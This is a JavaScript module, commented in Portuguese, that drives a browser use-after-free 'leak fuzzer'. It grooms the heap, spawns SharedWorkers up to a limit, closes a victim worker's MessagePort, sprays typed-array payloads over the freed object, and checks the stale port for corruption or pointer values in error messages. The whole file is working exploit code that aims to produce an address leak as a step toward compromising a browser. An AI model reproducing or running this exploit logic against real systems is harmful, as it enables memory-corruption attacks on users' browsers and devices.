import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap, clear_heap } from './heap.mjs';
import { build_leak_probe } from './payloads.mjs';

var workers_stash = [];
var current_test_idx = 0;
var is_running = false;
var interval_ref = null;

// ========================================================
// INICIALIZAÇÃO
// ========================================================
export function init() {
    const btnRun = document.getElementById("btn_run");
    const btnStop = document.getElementById("btn_stop");

    if(btnRun) btnRun.addEventListener("click", start_fuzzer);
    if(btnStop) btnStop.addEventListener("click", stop_fuzzer);
    
    log("Módulos prontos.", "success");
}

// ========================================================
// CONTROLE
// ========================================================
function stop_fuzzer() {
    is_running = false;
    if(interval_ref) clearInterval(interval_ref);
    log("FUZZER PARADO PELO USUÁRIO.", "fail");
    cleanup_round();
}

async function start_fuzzer() {
    if (!window.SharedWorker) return log("ERRO: SharedWorker não suportado.", "fail");
    if (is_running) return;

    is_running = true;
    current_test_idx = 0;
    log(">>> INICIANDO FUZZER DE LEAK <<<", "warn");
    
    test_next_size();
}

function test_next_size() {
    if (!is_running) return;

    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("CICLO COMPLETO. Nenhum leak encontrado. Recarregue a página.", "fail");
        is_running = false;
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()}`);

    // 1. Preparar Memória
    prepare_checkerboard_heap(size);
    
    // 2. Payload
    const payload = build_leak_probe(size);

    // 3. Trigger
    run_trigger(payload, size);
}

// ========================================================
// TRIGGER
// ========================================================
function run_trigger(payload, size) {
    let p_count = 0;
    // Precisamos criar o suficiente para chegar na zona de perigo (403)
    // Assumindo que o grooming não usou workers
    // Vamos criar 380 de base + o resto até 403
    
    workers_stash = [];

    // Base Rápida
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
    }

    const limit = CONFIG.WORKER_LIMIT - 380;

    interval_ref = setInterval(() => {
        if (!is_running) { clearInterval(interval_ref); return; }

        if (p_count >= limit) {
            clearInterval(interval_ref);
            
            // VÍTIMA (Último criado)
            const victim = workers_stash.pop();
            
            const result = attempt_leak(victim, payload, size);
            
            cleanup_round();
            clear_heap();
            
            if (result) {
                log(`!!! SUCESSO !!! Tamanho: 0x${size.toString(16)}`, "leak");
                is_running = false;
                alert("LEAK ENCONTRADO! Verifique os logs.");
            } else {
                current_test_idx++;
                setTimeout(test_next_size, 500);
            }
            return;
        }

        try {
            let w = new SharedWorker("data:text/javascript,1", "v_" + size + "_" + p_count);
            w.port.start();
            workers_stash.push(w);
        } catch(e) {}
        
        p_count++;
    }, 50);
}

function attempt_leak(victim, payload, size) {
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(new Uint32Array(payload));
    }

    // 3. LEITURA (Check)
    try {
        const s = port.toString();
        
        // Se mudou de [object MessagePort] para outra coisa
        if (s.indexOf("MessagePort") === -1) {
            log(`CORRUPÇÃO DETECTADA: ${s}`, "leak");
            return true;
        }
        
        // Tenta ler propriedade inválida para forçar erro com ponteiro
        // Isso geralmente falha silenciosamente em JS seguro, mas em UAF pode vazar
        try {
            let _ = port.onmessage;
        } catch(e) {
            if (e.toString().match(/0x[0-9a-fA-F]+/)) {
                log(`ERRO COM PONTEIRO: ${e}`, "leak");
                return true;
            }
        }

    } catch (e) {
        log(`Erro Genérico: ${e}`, "info");
    }
    
    return false;
}

function cleanup_round() {
    workers_stash.forEach(w => { try { w.port.close(); } catch(e){} });
    workers_stash = [];
}
